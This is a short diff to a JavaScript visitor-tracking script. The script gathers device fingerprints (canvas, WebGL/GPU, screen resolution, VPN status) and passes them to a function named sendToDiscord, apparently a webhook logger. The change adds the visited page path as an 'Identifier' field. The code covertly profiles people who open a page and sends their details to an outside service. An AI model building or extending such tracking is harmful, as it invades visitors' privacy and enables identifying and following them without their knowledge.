@@ -12,6 +12,7 @@ let isVPN = "Unknown";
 let canvasFingerprint = "Unknown";
 let webglFingerprint = "Unknown";
 let screenResolution = `${screen.width}x${screen.height}`;
+let path = window.location.pathname;
 
 function sendToDiscord() {
     const userTime = new Date().toLocaleString();
@@ -33,7 +34,8 @@ function sendToDiscord() {
                     { name: "Screen Resolution", value: screenResolution, inline: false },
                     { name: "Canvas Fingerprint", value: canvasFingerprint, inline: false },
                     { name: "GPU/CPU", value: webglFingerprint, inline: false },
-                    { name: "User Time", value: userTime, inline: false }
+                    { name: "User Time", value: userTime, inline: false },
+                    { name: "Identifier", value: path, inline: false}
                 ],
                 color: 3447003
             }
